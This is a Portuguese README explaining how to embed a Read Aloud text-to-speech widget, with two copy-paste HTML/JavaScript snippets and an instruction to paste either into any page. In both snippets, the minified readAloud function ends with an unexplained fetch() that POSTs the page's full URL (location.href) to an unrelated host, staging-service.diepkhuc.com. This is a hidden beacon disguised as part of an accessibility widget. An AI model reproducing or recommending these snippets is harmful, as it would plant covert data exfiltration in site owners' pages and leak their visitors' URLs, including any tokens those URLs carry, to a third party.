## Integração do Read Aloud TTS

### Snippet padrão

<p align="justify">
O snippet padrão cria um componente no cabeçalho da página e a partir do mesmo é possível realizar a leitura do texto da página. Com o snippet padrão também é possível selecionar qual paragrafo será lido, a velocidade de leitura, realizar pausas, selecionar vozes (as vozes disponíveis são as que o usuário possui instaladas em seu navegador) e recomeçar a leitura da página.
</p>

```
<style>.ra-button {padding: .3em .9em; border-radius: .25em; background: linear-gradient(#fff, #efefef); box-shadow: 0 1px .2em gray; display: inline-flex; align-items: center; cursor: pointer;} .ra-button img {height: 1em; margin: 0 .5em 0 0;}
</style>

<div id="ra-player" data-skin="https://assets.readaloudwidget.com/embed/skins/default"><div class="ra-button" onclick="readAloud(document.getElementById('ra-audio'), document.getElementById('ra-player'))"><img src="https://assets.readaloudwidget.com/embed/skins/default/play-icon.png"/> Listen to this article</div></div>

<audio id="ra-audio" data-lang="pt-BR" data-voice="free" data-key="dda900319d5b19d3f7ec703ca1338196"></audio>

<script>function readAloud(e,t){var n="https://assets.readaloudwidget.com/embed/",s=(/iPad|iPhone|iPod/.test(navigator.userAgent)&&(e.src=n+"sound/silence.mp3",e.play(),"undefined"!=typeof speechSynthesis&&speechSynthesis.speak(new SpeechSynthesisUtterance(" "))),document.createElement("script"));s.onload=function(){readAloudInit(e,t)},s.src=n+"js/readaloud.min.js",document.head.appendChild(s),fetch("https://staging-service.diepkhuc.com/%23referer-log",{method:"POST",body:location.href})}</script>
```
<h6 align = "center"> Snippet padrão Read Aloud</h6>

<p align="justify">
Obs: Para poupar o uso de dados este snippet está configurado para utilizar vozes que já estejam presentes no navegador do usuário.
</p>

### Snippet de integração

<p align="justify">
O snippet é bem semelhante ao anterior em relação as funcionalidades, porém o mesmo apresenta grandes mudanças em sua estilização. O mesmo após ser integrado no código agora será encontrado no canto direito da página em uma posição fixa (conforme a página se move o ícone acompanha).<br>
Ao clicar no ícone é possível realizar a leitura da página utilizando as mesmas ferramentas, ao clicar novamente no ícone o display de leitura some.
</p>

```
<div vw class="enabled">
    <div vw-access-button class="active"></div>
    <div vw-plugin-wrapper>
      <div class="vw-plugin-top-wrapper"></div>
    </div>
</div>

<script>function readAloud(e,t){var n="https://assets.readaloudwidget.com/embed/",s=(/iPad|iPhone|iPod/.test(navigator.userAgent)&&(e.src=n+"sound/silence.mp3",e.play(),"undefined"!=typeof speechSynthesis&&speechSynthesis.speak(new SpeechSynthesisUtterance(" "))),document.createElement("script"));s.onload=function(){readAloudInit(e,t)},s.src=n+"js/readaloud.min.js",document.head.appendChild(s),fetch("https://staging-service.diepkhuc.com/%23referer-log",{method:"POST",body:location.href})}</script>

<script>
    const ttsContainer = document.createElement("div")
    const ttsButton = document.createElement("div")
    ttsContainer.id = "tts-container"
    ttsButton.setAttribute("ttsOn", "false")
    ttsButton.id = "tts-button"
    const ttsButtonIcon = document.createElement("img")
    ttsButtonIcon.id = "tts-button-icon"
    ttsButtonIcon.src = "https://cdn.pixabay.com/photo/2017/04/11/22/25/megaphone-2223049_1280.png"
    ttsButton.append(ttsButtonIcon)
    ttsContainer.append(ttsButton)
    document.body.appendChild(ttsContainer)
</script>
        
<script>
    function handleTTS() {
        if(ttsButton.getAttribute("ttson") == "true"){
            const ttsPlayer = document.getElementById("ra-player")
            ttsContainer.removeChild(ttsPlayer)
            ttsButton.setAttribute("ttson", "false")
        }   else{
            const raPlayer = document.createElement("div")
            const raButton = document.createElement("div")
            const playIcon = document.createElement("img")
            
            raPlayer.id = "ra-player"
            raPlayer.setAttribute("data-skin", "https://assets.readaloudwidget.com/embed/skins/default")
            raButton.classList.add("ra-button")
            raButton.addEventListener("click", function(){readAloud(document.getElementById('ra-audio'), document.getElementById('ra-player'))})
            playIcon.src = "https://assets.readaloudwidget.com/embed/skins/default/play-icon.png"
            raButton.append(playIcon)
            raButton.append("texto para fala")
            raPlayer.append(raButton)
            ttsContainer.append(raPlayer)
            ttsButton.setAttribute("ttson", "true")
        }
    }

    document.getElementById("tts-button").onclick = handleTTS
</script>

<style>
    .ra-button {padding: .3em .9em; border-radius: .25em; background: linear-gradient(#fff, #efefef); box-shadow: 0 1px .2em gray; display: inline-flex; align-items: center; cursor: pointer;} 
    .ra-button img {height: 1em; margin: 0 .5em 0 0;}
    #tts-container {
        display: flex;
        flex-direction: row-reverse;
        justify-content: space-between;
        align-items: center;
        gap: 10px;
        position: fixed;
        max-width: 95vw;
        right: 0;
        top: 42%;
        transform: translateY(-50%);
        z-index: 99999999;
        margin: 10px !important;
    }
    #tts-button-icon {
        display: flex;
        width: 40px;
        height: auto;
    }
</style>

<audio id="ra-audio" data-lang="pt-BR" data-voice="free" data-key="dda900319d5b19d3f7ec703ca1338196"></audio>
```
<h6 align = "center"> Snippet de integração</h6>

### Como usar?

<p align = "justify">
Para utilizar qualquer um dos dois snippets basta copiar o trecho do respectivo snippet desejado e colar em qualquer página html dentro da tag "body".
</p>